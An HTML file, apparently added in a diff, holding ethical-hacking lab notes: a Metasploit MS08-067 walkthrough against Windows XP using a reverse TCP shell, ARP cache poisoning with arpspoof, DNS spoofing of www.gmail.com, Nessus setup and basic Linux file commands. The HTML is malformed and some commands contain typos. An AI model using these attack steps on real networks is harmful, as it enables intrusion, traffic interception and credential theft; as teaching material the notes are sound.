@@ -1,0 +1,161 @@
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Keynote</title>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+exploit windows xp by  Metasploit
+
+Starting Metasploit Framework in Kali VM:
+#service postgresql start
+#service metasploit start
+#msfconsole
+
+1) Metasploit search command usage
+#search ms08–067
+
+2) Metasploit Info command usage
+#Info exploit/windows/smb/ms08_067_netapi
+
+3) Metasploit use command usage
+#use windows/smb/ms08_067_netapi
+
+4) Setting up the Module Options in Metasploit
+#show options
+
+5) Setting RHOST to Target Windows XP VM IP Address
+#Set RHOST 192.168.0.8
+
+6) Using an Available Target for specific Metasploit Module
+#show targets
+#set Target (Target Number)
+
+7) Selecting and using any of Compatible Payloads for this Exploit module
+#show payloads
+#set payload windows/shell_reverse_tcp
+
+8) Setting up Payload Options before exploitation
+#show options
+#set LHOST 192.168.0.7
+
+9) Exploiting the Target with Metasploit
+#exploit
+------------------------------------------------------------------------------------------------------------------------------------------
+
+ARP Cache Poisoning
+1- The attacker  scan the network to determine the IP addresses of at least two devices⁠.
+
+2-The attacker uses a spoofing tool, such as Arpspoof or Driftnet, to send out forged ARP responses. 
+
+3- The forged responses advertise that the correct MAC address for both IP addresses, belonging to the router , is the attacker’s MAC address. 
+
+4- The two devices update their ARP cache entries and from that point onwards.
+
+5- The attacker is now in the middle.
+
+ARP Cache Poisoning with Arpspoof 
+1)  We need to turn on IP forwarding
+root@kali:~# echo 1 >/proc/sys/net/ipv4/ip_forward
+2) To view the ARP cache in our Kali machine
+root@kali:~#arp
+3)To fool the Linux target into thinking we are the Windows XP machine
+root@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.10 
+4)To capture the other side of the conversation		 	 		
+root@kali:~# arpspoof -i eth0 -t 192.168.20.10 192.168.20.11 
+		 	 	 		
+5) To check your Linux target’s ARP cache again
+root@kali:~#Arp -a					
+ 6)log in to the Windows XP target’s FTP server 		
+root@kali:~# ftp 192.168.20.10
+
+
+Using ARP Cache Poisoning to Impersonate the Default Gateway
+root@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.1
+root@kali:~# arpspoof -i eth0 -t 192.168.20.1 192.168.20.11
+
+------------------------------------------------------------------------------------------------------------------------------------------		
+		
+DNS Cache Poisoning using Dnsspoof			
+step 1:
+root@kali~# nslookup www.gmail.com 	
+step 2:			
+root@kali:~# service apache2 start	
+step 3:			
+root@kali:~# cat hosts.txt 
+step 4:write ip and domain in hosts.txt	
+192.168.20.9 www.gmail.com 	
+step 5:		
+root@kali:~# dnsspoof -i eth0  -f hosts.txtv
+------------------------------------------------------------------------------------------------------------------------------------------
+Install Nessus
+1. Open Applications->Web Browser and enter
+http://www.tenable.com/products/nessus-home/ in the address bar. Complete the Register for an Activation Code information and click Register.
+(Use a real email address—you’ll need the activation code later.)
+2. Once you reach the Downloads page, choose the latest version of Nessus for the Linux Debian 32-bit platform (Nessus-5.2.5-debian6_i386.deb and download it to your root 
+directory (the default download location).
+3. Open a Linux terminal (click the terminal icon at the top of the Kali
+screen) to open a root prompt.
+4. Enter ls to see a list of the files in your root directory. You should see the Nessus file that you just downloaded.
+
+5. Enter dpkg -i followed by the name of the file you downloaded (you can
+type the first letter of the filename and press tab to use tab completion) and press enter to begin the install process. Installation may take a while as Nessus processes 
+various plugins. Progress is shown by a line of hash symbols (#).
+
+
+root@kali:~# /etc/init.d/nessusd start
+
+------------------------------------------------------------------------------------------------------------------------------------------
+#Change the normal user to root permission 
+sudo su
+
+#Create a folder named as Test in the current directory
+Mkdir Test
+
+#Create a file named activity1 in the Test folder
+cd Test 
+touch activity1
+
+#Add the following contents to activity1 file “Ethical hacking is an important skill but it must be taken seriously.”
+
+echo Ethical hacking assignment and ppt preparation > activity1
+
+#Edit the file activity1 use Vi editor and add the statement “all the best for this project work”
+Vi activity1 
+Save and exit
+Insert key to type information 
+Then press Esc key  ( :WQ) for save and exit 
+
+#Check the file is available in the Test folder
+ ls
+#Display the contents of activity1 
+cat activity1
+
+#Check file permission of the file using
+ls  -l  activity1
+#Change the file permission of the activity 1  to access this file (read/wirte and execute) for all local, group and global users
+
+Chmod 777 activity 1
+
+#Check current changed permission of activity1 file 
+
+Ls –l activtity1 
+
+#Copy the file from Test  folder to Documents folder
+cp activity 1  /root/home/Documents
+
+#Go to the Documents folder
+cd /root/home/Documents
+
+#Check file activity1 is available or not?
+Ls 
+#clear the screen 
+Clear 
+#Exit from root permission for your user account 
+cd.. 
+exit 
+------------------------------------------------------------------------------------------------------------------------------------------
+No Permission=0
+Execute=1
+Write=2
+Read=4
